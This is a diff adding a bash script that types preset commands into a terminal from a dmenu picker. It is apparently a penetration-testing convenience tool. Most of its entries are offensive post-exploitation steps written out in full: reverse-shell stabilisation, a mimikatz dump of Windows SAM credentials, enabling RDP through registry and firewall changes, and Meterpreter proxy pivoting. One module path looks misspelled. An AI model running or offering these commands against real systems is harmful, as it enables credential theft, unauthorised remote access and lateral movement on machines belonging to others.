@@ -1,0 +1,113 @@
+#!/bin/bash
+# auto_shell.sh
+# Created on: Tue 11 Aug 2020 11:44:27 AM CEST
+#
+#  ____   __  ____  __
+# (  _ \ /. |(  _ \/  )
+#  )___/(_  _))___/ )(
+# (__)    (_)(__)  (__)
+#
+# Description:
+#  Script to setup tty shell information without typo
+
+# functions for a nicer syntax
+function command() {
+	xte "str $1"
+	sleep 0.5
+	xte "key Return"
+}
+
+function key() {
+	xte "str $1"
+	sleep 0.5
+}
+
+function ctrl() {
+	xte "keydown Control_L" "key $1" "keyup Control_L"
+}
+
+function_meta=("Stabilise_reverse_shell" "Stabilise_reverse_shell3" \
+	"vim_hexdump_ascii" "vim_hexdump_binary" "meterpreter_proxychain" \
+	"tmux_sinc_panes_on" "tmux_sinc_panes_off" "mimikatz_dump_sam" "activate_rdp")
+
+# function that are needed
+function stabilize_rev_shell() {
+	command "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+	ctrl Z
+	command "stty raw -echo"
+	command "fg"
+	command "export TERM=xterm"
+}
+
+function activate_rdp() {
+	command "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+	command "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes"
+}
+
+function mimikatz_dump_sam() {
+	command "privilege::debug"
+	command "token::elevate"
+	command "lsadump::sam"
+}
+
+function tmux_sinc_panes_on() {
+	ctrl A
+	key ":"
+	command "setw synchronize-panes on"
+}
+
+function tmux_sinc_panes_off() {
+	ctrl A
+	key ":"
+	command "setw synchronize-panes off"
+}
+
+function stabilize_rev_shell3() {
+	command "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+	ctrl Z
+	command "stty raw -echo"
+	command "fg"
+	command "export TERM=xterm"
+}
+
+function vim_hexdump_to_ascii() {
+	xte "key Escape"
+	command ":%!xxd"
+}
+
+function vim_hexdump_to_binary() {
+	xte "key Escape"
+	command ":%!xxd -r"
+}
+
+function meterpreter_proxychain() {
+	command "background"
+	command "use auxiliary/server/socks4a"
+	command "use post/mult/manage/autoroute"
+}
+
+ret=$(echo ${function_meta[*]} | tr ' ' '\n' | dmenu "$@")
+
+
+if [ ! -z $ret ]; then
+	sleep 2
+	if [ $ret = "Stabilise_reverse_shell" ]; then
+		stabilize_rev_shell
+	elif [ $ret = "Stabilise_reverse_shell3" ]; then
+		stabilize_rev_shell3
+	elif [ $ret = "vim_hexdump_ascii" ]; then
+		vim_hexdump_to_ascii
+	elif [ $ret = "vim_hexdump_binary" ]; then
+		vim_hexdump_to_binary
+	elif [ $ret = "meterpreter_proxychain" ]; then
+		meterpreter_proxychain
+	elif [ $ret = "tmux_sinc_panes_on" ]; then
+		tmux_sinc_panes_on
+	elif [ $ret = "tmux_sinc_panes_off" ]; then
+		tmux_sinc_panes_off
+	elif [ $ret = "mimikatz_dump_sam" ]; then
+		mimikatz_dump_sam
+	elif [ $ret = "activate_rdp" ]; then
+		activate_rdp
+	fi
+fi
